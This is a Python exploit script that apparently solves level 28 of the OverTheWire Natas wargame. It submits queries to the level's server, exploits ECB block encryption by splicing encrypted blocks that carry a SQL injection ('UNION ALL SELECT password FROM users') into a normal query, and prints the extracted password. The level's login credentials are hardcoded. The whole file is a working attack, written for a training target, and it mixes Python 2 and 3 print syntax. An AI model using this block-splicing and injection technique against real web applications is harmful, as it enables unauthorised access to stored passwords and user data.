#!/bin/python3
# Padding Attack
import requests
import base64
import re

username="natas28"
password="JWwR438wkgTsNKBbcJoowyysdM82YjeF"
url="http://natas28.natas.labs.overthewire.org/?query="

# Grab query
def q(s):
    s = requests.utils.quote(s)
    resp = requests.get(url+s,auth=(username,password))
    resp = re.findall("query=(.*)",resp.url)[0]
    resp = requests.utils.unquote(resp)
    ret = base64.b64decode(resp)
    return ret

# Prepend 9 spaces to fill third block
apos = (" " * 9) + "' UNION ALL SELECT password FROM users;#"

# Just a calculation to find how many blocks our encrypted
blocks = (len(apos) - 10)
while blocks % 16 != 0:
    blocks = blocks + 1
blocks = blocks / 16
inject = q(apos)

# Create an ordinary query that ends the third block
spaces = " " * 10
base = q(spaces)

# Patch in our encrypted blocks that contain our sql injection
b64 = base64.b64encode(base[0:48] + inject[48:int(48 + 16*blocks)] + base[48:])
query=requests.utils.quote(b64)

# ReWritten URL
url = "http://natas28.natas.labs.overthewire.org/search.php/?query="
url = url+query.replace("/","%2F")
print url
# Grab Flag
resp = requests.get(url,auth=(username,password))
flag = re.findall("<li>(.*)</li>",resp.text)[0]
print(flag)